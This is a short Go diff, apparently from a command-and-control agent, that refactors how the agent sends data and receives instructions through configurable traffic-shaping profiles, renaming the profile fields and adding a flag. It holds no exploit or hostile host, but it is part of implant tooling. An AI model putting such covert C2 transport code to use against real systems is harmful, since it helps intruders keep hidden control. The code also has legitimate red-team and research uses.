@@ -6,11 +6,11 @@ import (
 )
 
 func send(agentId *string, profile *profiles.Profile, data *string) (err error) {
-	reqBody, err := profiles.OperateData(&profile.Outcall.Payload.Operations, data)
+	reqBody, err := profiles.OperateData(&profile.Respond.Payload.Operations, data, true)
 	if err != nil {
 		return err
 	}
-	processedAgentId, err := profiles.OperateData(&profile.Outcall.ID.Operations, agentId)
+	processedAgentId, err := profiles.OperateData(&profile.Respond.ID.Operations, agentId, true)
 	if err != nil {
 		return err
 	}
@@ -36,7 +36,7 @@ func send(agentId *string, profile *profiles.Profile, data *string) (err error) 
 }
 
 func receive(agentId *string, profile *profiles.Profile) (instruction string, err error) {
-	processedAgentId, err := profiles.OperateData(&profile.Outcall.ID.Operations, agentId)
+	processedAgentId, err := profiles.OperateData(&profile.Receive.ID.Operations, agentId, true)
 	if err != nil {
 		return "", err
 	}
@@ -69,5 +69,5 @@ func receive(agentId *string, profile *profiles.Profile) (instruction string, er
 
 	bodyStr := string(body)
 
-	return profiles.OperateData(&profile.Incall.Payload.Operations, &bodyStr)
+	return profiles.OperateData(&profile.Receive.Payload.Operations, &bodyStr, false)
 }
